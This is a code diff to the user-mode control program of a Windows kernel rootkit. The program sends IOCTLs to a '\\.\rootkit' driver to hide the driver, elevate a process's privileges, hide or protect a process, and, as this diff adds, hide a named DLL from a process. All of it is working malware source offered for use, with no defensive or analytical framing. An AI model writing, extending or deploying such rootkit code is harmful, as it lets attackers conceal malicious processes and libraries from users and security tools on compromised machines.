@@ -12,9 +12,12 @@ namespace Rootkit {
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
         constexpr ULONG ProtectProcess =
             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
+        constexpr ULONG HideDLL =
+            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
     }
     struct Request {
         HANDLE process_id;
+        WCHAR DLLName[256];
     };
 
 
@@ -31,7 +34,24 @@ namespace Rootkit {
             &bytes_returned,             // Bytes returned
             nullptr                      // Overlapped
         );
-      
+
+    }
+
+    bool HideDLL(HANDLE driver_handle, DWORD pid, WCHAR* DLLName) {
+        Request r;
+        r.process_id = UlongToHandle(pid);
+        wcsncpy_s(r.DLLName, DLLName, _TRUNCATE); // Safely copy the DLLName into r.DLLName
+
+        return DeviceIoControl(
+            driver_handle,
+            codes::HideDLL,
+            &r,
+            sizeof(r),
+            &r,
+            sizeof(r),
+            nullptr,
+            nullptr
+        );
     }
 
     bool ElevateProcess(HANDLE driver_handle, DWORD pid) {
@@ -92,6 +112,7 @@ void showMenu() {
     std::cout << "2. Elevate Process\n";
     std::cout << "3. Hide Process\n";
     std::cout << "4. Protect Process\n";
+    std::cout << "5. Hide DLL from process.\n";
     std::cout << "99. Exit\n";
     std::cout << "=======================\n";
     std::cout << "Enter your choice: ";
@@ -102,13 +123,13 @@ int main() {
 
     // Request more comprehensive access rights
     const HANDLE driver_handle = CreateFile(
-        L"\\\\.\\rootkit",                    // Device name
-        GENERIC_READ | GENERIC_WRITE,         // Desired access
-        FILE_SHARE_READ | FILE_SHARE_WRITE,   // Share mode
-        nullptr,                              // Security attributes
-        OPEN_EXISTING,                        // Creation disposition
-        FILE_ATTRIBUTE_NORMAL,                // Flags and attributes
-        nullptr                               // Template file
+        L"\\\\.\\rootkit",
+        GENERIC_READ | GENERIC_WRITE,
+        FILE_SHARE_READ | FILE_SHARE_WRITE,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
     );
 
     if (driver_handle == INVALID_HANDLE_VALUE) {
@@ -129,45 +150,64 @@ int main() {
 
     std::cout << "Got a driver handle!\n";
 
+    // Move all variable declarations here before the switch
     int choice;
+    int pid;
+    int pidHide;
+    int pidProtect;
+    int pidDLLHide;
+    WCHAR DLLName[256];
+    std::wstring tempDLLName;
 
     while (true) {
         showMenu();
-
         std::cin >> choice;
 
         switch (choice) {
-        case 1:
+        case 1: {
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideTheDriver(driver_handle);
             break;
-
-        case 2:
-            int pid;
+        }
+        case 2: {
             std::cout << "Enter a PID: ";
             std::cin >> pid;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::ElevateProcess(driver_handle, pid);
             break;
-        case 3:
-            int pidHide;
+        }
+        case 3: {
             std::cout << "Enter a PID: ";
             std::cin >> pidHide;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideProcess(driver_handle, pidHide);
             break;
-        case 4:
-            int pidProtect;
+        }
+        case 4: {
             std::cout << "Enter a PID: ";
             std::cin >> pidProtect;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::ProtectProcess(driver_handle, pidProtect);
             break;
-        case 99:
+        }
+        case 5: {
+            std::wcin.ignore(); // Clear any leftover input in the stream
+            std::wcout << L"Enter a PID: ";
+            std::cin >> pidDLLHide;
+            std::wcout << L"\nEnter the DLL name you wish to hide (e.g., example.dll): ";
+            std::wcin >> tempDLLName;
+            wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
+            std::wcout << L"[!] Sending Message to Driver.\n";
+            Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
+            break;
+        }
+        case 99: {
             std::cout << "Exiting the program, bye!\n";
             break;
-        default:
+        }
+        default: {
             std::cout << "Invalid Choice.\n";
+        }
         }
         CloseHandle(driver_handle);
         std::cout << "Ended\n";
